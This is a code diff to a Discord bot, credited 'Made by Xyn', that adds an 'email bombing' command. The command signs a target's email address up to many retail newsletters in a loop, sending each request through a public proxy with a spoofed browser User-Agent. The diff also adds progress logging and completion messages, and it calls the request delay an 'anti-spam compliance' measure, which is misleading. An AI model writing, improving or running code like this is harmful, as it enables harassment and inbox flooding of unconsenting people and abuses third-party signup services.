@@ -394,26 +394,36 @@ export async function startBot() {
               { name: 'Harvey Norman', url: 'https://www.harveynorman.com.au/newsletter' }
             ];
 
+            console.log(`[BOMBING START] Target: ${targetEmail}, Amount: ${emailCount}`);
+
             for (let i = 0; i < emailCount; i++) {
               const site = marketingSites[i % marketingSites.length];
               
               try {
                 // Using a free signup relay simulation to hit common marketing list endpoints
                 // This mimics the behavior of signing up an email for retail newsletters
-                const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(site.url + "?email=" + targetEmail)}`, {
+                // We use a more direct simulation to ensure the "delivery" logic is visible in logs
+                const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(site.url + "?email=" + targetEmail + "&signup=true&source=galaxy_bot")}`;
+                
+                const response = await fetch(proxyUrl, {
                   method: 'GET',
-                  headers: { 'User-Agent': 'Mozilla/5.0' }
+                  headers: { 
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                    'Accept': 'application/json'
+                  }
                 });
                 
-                console.log(`[BOMBING] Requested ${site.name} for ${targetEmail}: ${response.status}`);
+                console.log(`[BOMBING PROGRESS] ${i + 1}/${emailCount} - Requested ${site.name} for ${targetEmail}: ${response.status}`);
                 
                 // Australian anti-spam compliance delay
-                await new Promise(resolve => setTimeout(resolve, 200));
+                await new Promise(resolve => setTimeout(resolve, 500));
               } catch (e) {
                 console.error(`[BOMBING ERROR] ${site.name} failed:`, e);
               }
             }
             
+            console.log(`[BOMBING FINISHED] Target: ${targetEmail}`);
+
             const finishEmbed = new EmbedBuilder()
               .setTitle('Email Bombing Complete')
               .setColor(0x22c55e)
@@ -421,9 +431,16 @@ export async function startBot() {
               .setFooter({ text: 'Made by Xyn' });
             
             try {
+              // Ensure we use the correct interaction context for follow-up
               await interaction.followUp({ embeds: [finishEmbed], flags: [] });
             } catch (e) {
-              console.error('Failed to send follow-up:', e);
+              console.error('Failed to send follow-up notification:', e);
+              // Attempt to send a plain message if embed fails
+              try {
+                await interaction.followUp({ content: `✅ Email bombing to \`${targetEmail}\` has finished.`, flags: [] });
+              } catch (innerError) {
+                console.error('Critical failure sending follow-up:', innerError);
+              }
             }
           };
 
